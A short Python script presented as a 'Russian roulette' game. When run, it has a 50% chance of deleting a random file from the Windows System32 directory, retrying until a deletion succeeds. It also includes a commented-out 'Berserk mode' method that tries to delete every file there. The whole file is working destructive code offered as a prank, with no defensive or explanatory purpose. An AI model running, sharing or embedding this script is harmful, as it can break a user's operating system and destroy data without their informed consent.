import os
import random


class RussianRoulette:
    DIRECTORY = r"C:\Windows\System32"

    def __init__(self):
        self._randint: int = None
        self._random_file: str = None

    @property
    def _list_targets(self) -> list[str]:
        return os.listdir(self.DIRECTORY)

    def spin_the_cylinder(self) -> int:
        self._randint = random.randint(0, 1)

    def aim(self):
        self._random_file: str = random.choice(self._list_targets)

    def shoot(self):
        """Shoots a single bullet"""
        if self._randint == 0:
            while True:
                try:
                    os.remove(os.path.join(self.DIRECTORY + '\\' + self._random_file))
                except PermissionError:  # even with full control, anw Windows doesn't allow to delete some files
                    self.aim()
                    continue
                else:
                    print(f'Ouch, {self._random_file}, was deleted.'
                          f'However, don\'t be upset, {len(self._list_targets)} files left.')
                    break
        else:
            print("Look at this lucky face! \nCongratulations, your OS survived!")


    def play(self):
        """Spins the cylinder, aims, shoots in one function call."""
        self.spin_the_cylinder()
        self.aim()
        self.shoot()

    def kill_em_all(self):
        """Berserk mode"""
        for prey in self._list_targets:
            try:
                os.remove(os.path.join(self.DIRECTORY + '\\' + prey))
                print(f'Ouch, {prey}, was deleted.')
            except PermissionError:
                continue


if __name__ == "__main__":
    game = RussianRoulette()
    game.spin_the_cylinder()
    game.aim()
    game.shoot()
    # game.kill_em_all()